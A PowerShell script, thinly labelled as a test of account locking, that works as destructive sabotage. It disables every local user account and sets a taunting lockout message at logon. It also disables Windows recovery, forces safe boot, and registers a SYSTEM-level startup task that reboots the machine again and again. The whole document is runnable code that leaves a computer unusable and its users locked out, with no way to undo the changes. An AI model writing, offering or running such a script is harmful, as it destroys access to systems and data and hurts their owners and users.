# Disable ALL Users (If You're Testing Account Locking)
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    Disable-LocalUser -Name $user.Name
}

# Setup Playful Lockout Message
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value @"
Ah~ Sweetheart, you're locked out <3
No matter how much you try, the door is closed for you now~
Go ahead, stare at the screen, pout all you want~
But you won't be getting back in~

You must be wondering, "Is this it? Will I ever get back in?"
Oh, love~ You already know the answer, don't you?

Tick-tock, tick-tock~
The end is near~ So sit back and watch the magic happen <3
"@ -PropertyType String -Force

# Create Post-Reboot Script
$PostRebootScript = @"
# Post-Reboot Actions
Start-Sleep -Seconds 5  # Wait for Windows to settle

# Modify Boot Settings (Safe Mode with Networking)
bcdedit /set {default} bootmenupolicy legacy
bcdedit /set {current} bootstatuspolicy ignoreallfailures
bcdedit /set {current} recoveryenabled no
bcdedit /set {current} safeboot network

# OPTIONAL: Restart Again If Needed
shutdown /r /f /t 3
"@

# Save Post-Reboot Script
$PostRebootScriptPath = "C:\PostRebootScript.ps1"
$PostRebootScript | Out-File -FilePath $PostRebootScriptPath -Force

# Schedule Post-Reboot Script with Task Scheduler
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\PostRebootScript.ps1"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Description "Runs the post-reboot script."
Register-ScheduledTask -TaskName "PostRebootTask" -InputObject $Task -Force

# Restart Once (Script Will Run After Reboot)
shutdown /r /f /t 3
